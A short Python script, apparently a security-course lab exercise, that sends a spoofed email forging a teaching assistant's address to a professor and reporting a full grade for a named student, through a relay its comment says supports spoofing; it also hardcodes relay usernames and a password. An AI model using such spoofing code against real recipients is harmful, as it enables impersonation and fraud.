import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders

def send_email(toaddr, my_username, my_password):

    msg = MIMEMultipart()
 
    msg['From'] = "2107tda@cs2107.spro.ink"
    msg['To'] = toaddr
    msg['Subject'] = "Assignment Grades"
    body = "dez_lee@u.nus.edu:A0161415N:100/100"
 
    msg.attach(MIMEText(body, 'plain'))

    recipients = [toaddr, "dez_lee@u.nus.edu"] #bcc myself also to see if the message format is correct
    
    smtp = smtplib.SMTP('mail.smtp2go.com', 2525) #smtp server which supports spoofing
    smtp.ehlo()
    smtp.starttls()
    smtp.login( my_username,  my_password)
    text = msg.as_string()
    smtp.sendmail(toaddr, recipients, text)
 
    smtp.quit()

send_email("prof@cs2107.spro.ink", "kengchi5@gmail.com", "de_zhang")
try:
    send_email("prof@cs2107.spro.ink", "kengchi1@gmail.com", "de_zhang") #replace username and password with valid credentials
except:
    print("Fail to send email")
    
